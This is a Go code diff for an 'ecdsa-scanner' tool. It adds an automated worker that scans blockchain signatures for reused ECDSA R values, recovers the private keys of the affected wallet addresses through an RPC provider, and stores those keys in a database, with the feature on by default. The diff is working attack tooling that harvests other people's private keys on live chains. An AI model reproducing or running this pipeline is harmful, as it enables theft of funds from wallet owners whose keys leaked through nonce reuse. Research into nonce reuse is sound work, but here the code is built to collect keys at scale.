@@ -14,6 +14,7 @@ import (
 	"ecdsa-scanner/internal/config"
 	"ecdsa-scanner/internal/db"
 	"ecdsa-scanner/internal/logger"
+	"ecdsa-scanner/internal/recovery"
 	"ecdsa-scanner/internal/retry"
 )
 
@@ -64,27 +65,45 @@ type ChainScanner struct {
 	lastErrorTime  time.Time
 }
 
+// RecoveryCandidate holds info for key recovery
+type RecoveryCandidate struct {
+	RValue  string
+	Address string
+	Chain   string
+	TxHash1 string
+	TxHash2 string
+}
+
 // Scanner coordinates scanning across all chains
 type Scanner struct {
-	db            db.Database
-	logger        *logger.Logger
-	chainScanners map[string]*ChainScanner
-	mu            sync.RWMutex
-	writeQueue    chan db.Signature
-	writeErrors   int
+	db              db.Database
+	logger          *logger.Logger
+	chainScanners   map[string]*ChainScanner
+	mu              sync.RWMutex
+	writeQueue      chan db.Signature
+	recoveryQueue   chan RecoveryCandidate
+	writeErrors     int
+	recoveryEnabled bool
+	ankrAPIKey      string
 }
 
 // New creates a new Scanner
 func New(database db.Database, log *logger.Logger, ankrAPIKey string) (*Scanner, error) {
 	s := &Scanner{
-		db:            database,
-		logger:        log,
-		chainScanners: make(map[string]*ChainScanner),
-		writeQueue:    make(chan db.Signature, 10000),
+		db:              database,
+		logger:          log,
+		chainScanners:   make(map[string]*ChainScanner),
+		writeQueue:      make(chan db.Signature, 10000),
+		recoveryQueue:   make(chan RecoveryCandidate, 100),
+		recoveryEnabled: true,
+		ankrAPIKey:      ankrAPIKey,
 	}
 
 	// Start batch writer
 	go s.batchWriter()
+
+	// Start recovery worker
+	go s.recoveryWorker()
 
 	// Initialize chain scanners
 	for _, cfg := range config.DefaultChains() {
@@ -437,27 +456,56 @@ func (s *Scanner) batchWriter() {
 		case sig := <-s.writeQueue:
 			batch = append(batch, sig)
 			if len(batch) >= 1000 {
-				s.flushBatch(batch)
+				s.flushBatchAndRecover(batch)
 				batch = batch[:0]
 			}
 		case <-ticker.C:
 			if len(batch) > 0 {
-				s.flushBatch(batch)
+				s.flushBatchAndRecover(batch)
 				batch = batch[:0]
 			}
 		}
 	}
 }
 
-func (s *Scanner) flushBatch(batch []db.Signature) {
+func (s *Scanner) flushBatchAndRecover(batch []db.Signature) {
 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 	defer cancel()
 
-	if err := s.db.InsertSignatures(ctx, batch); err != nil {
+	// Insert and find any duplicates
+	duplicates, err := s.db.InsertSignaturesAndFindDuplicates(ctx, batch)
+	if err != nil {
 		s.mu.Lock()
 		s.writeErrors++
 		s.mu.Unlock()
 		s.logger.Error("Failed to insert batch of %d signatures: %v", len(batch), err)
+		return
+	}
+
+	// Queue any same-key duplicates for recovery
+	if s.recoveryEnabled && len(duplicates) > 0 {
+		for _, dup := range duplicates {
+			if !dup.SameKey || len(dup.Entries) < 2 {
+				continue
+			}
+
+			candidate := RecoveryCandidate{
+				RValue:  dup.RValue,
+				Address: dup.Entries[0].Address,
+				Chain:   dup.Entries[0].Chain,
+				TxHash1: dup.Entries[0].TxHash,
+				TxHash2: dup.Entries[1].TxHash,
+			}
+
+			// Non-blocking send to recovery queue
+			select {
+			case s.recoveryQueue <- candidate:
+				s.logger.Info("[RECOVERY] Queued recovery for %s on %s (R=%s...)",
+					candidate.Address[:16]+"...", candidate.Chain, candidate.RValue[:18]+"...")
+			default:
+				s.logger.Warn("[RECOVERY] Queue full, skipping recovery for %s", candidate.Address)
+			}
+		}
 	}
 }
 
@@ -466,4 +514,107 @@ func (s *Scanner) GetWriteErrors() int {
 	s.mu.RLock()
 	defer s.mu.RUnlock()
 	return s.writeErrors
+}
+
+// GetRPCURL returns the RPC URL for a chain
+func (s *Scanner) GetRPCURL(chainName string) string {
+	cs, ok := s.chainScanners[chainName]
+	if !ok {
+		return ""
+	}
+	return cs.config.RPCURL
+}
+
+// getRPCURLWithKey returns the RPC URL with API key appended if needed
+func (s *Scanner) getRPCURLWithKey(chainName string) string {
+	for _, chain := range config.DefaultChains() {
+		if chain.Name == chainName {
+			rpcURL := chain.RPCURL
+			if s.ankrAPIKey != "" && strings.Contains(rpcURL, "ankr.com") {
+				rpcURL = rpcURL + "/" + s.ankrAPIKey
+			}
+			return rpcURL
+		}
+	}
+	return ""
+}
+
+// recoveryWorker processes the recovery queue
+func (s *Scanner) recoveryWorker() {
+	for candidate := range s.recoveryQueue {
+		s.processRecovery(candidate)
+	}
+}
+
+// processRecovery attempts to recover a private key from a duplicate R value
+func (s *Scanner) processRecovery(candidate RecoveryCandidate) {
+	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+	defer cancel()
+
+	// Double-check this key hasn't already been recovered
+	alreadyRecovered, err := s.db.IsKeyRecovered(ctx, candidate.Address, candidate.Chain)
+	if err != nil {
+		s.logger.Warn("[RECOVERY] Failed to check recovery status for %s: %v", candidate.Address, err)
+		return
+	}
+	if alreadyRecovered {
+		s.logger.Info("[RECOVERY] Key for %s on %s already recovered, skipping", candidate.Address, candidate.Chain)
+		return
+	}
+
+	rpcURL := s.getRPCURLWithKey(candidate.Chain)
+	if rpcURL == "" {
+		s.logger.Warn("[RECOVERY] No RPC URL for chain %s", candidate.Chain)
+		return
+	}
+
+	s.logger.Info("[RECOVERY] Attempting key recovery for %s on %s", candidate.Address, candidate.Chain)
+	s.logger.Info("[RECOVERY]   TX1: %s", candidate.TxHash1)
+	s.logger.Info("[RECOVERY]   TX2: %s", candidate.TxHash2)
+
+	recoveredKey, err := recovery.RecoverPrivateKey(ctx, rpcURL, candidate.TxHash1, candidate.TxHash2)
+	if err != nil {
+		s.logger.Error("[RECOVERY] Failed to recover key for %s: %v", candidate.Address, err)
+		return
+	}
+
+	// Verify the recovered address matches
+	if !strings.EqualFold(recoveredKey.Address, candidate.Address) {
+		s.logger.Error("[RECOVERY] Recovered address %s doesn't match expected %s",
+			recoveredKey.Address, candidate.Address)
+		return
+	}
+
+	// Save to database
+	dbKey := &db.RecoveredKey{
+		Address:    recoveredKey.Address,
+		PrivateKey: recoveredKey.PrivateKey,
+		Chain:      candidate.Chain,
+		RValue:     recoveredKey.RValue,
+		TxHash1:    recoveredKey.TxHash1,
+		TxHash2:    recoveredKey.TxHash2,
+	}
+
+	if err := s.db.SaveRecoveredKey(ctx, dbKey); err != nil {
+		s.logger.Error("[RECOVERY] Failed to save recovered key for %s: %v", candidate.Address, err)
+		return
+	}
+
+	s.logger.Info("[RECOVERY] *** SUCCESS *** Recovered private key for %s on %s", candidate.Address, candidate.Chain)
+	s.logger.Info("[RECOVERY]   Private Key: %s...%s",
+		recoveredKey.PrivateKey[:10], recoveredKey.PrivateKey[len(recoveredKey.PrivateKey)-6:])
+}
+
+// SetRecoveryEnabled enables or disables automatic key recovery
+func (s *Scanner) SetRecoveryEnabled(enabled bool) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	s.recoveryEnabled = enabled
+}
+
+// IsRecoveryEnabled returns whether automatic key recovery is enabled
+func (s *Scanner) IsRecoveryEnabled() bool {
+	s.mu.RLock()
+	defer s.mu.RUnlock()
+	return s.recoveryEnabled
 }
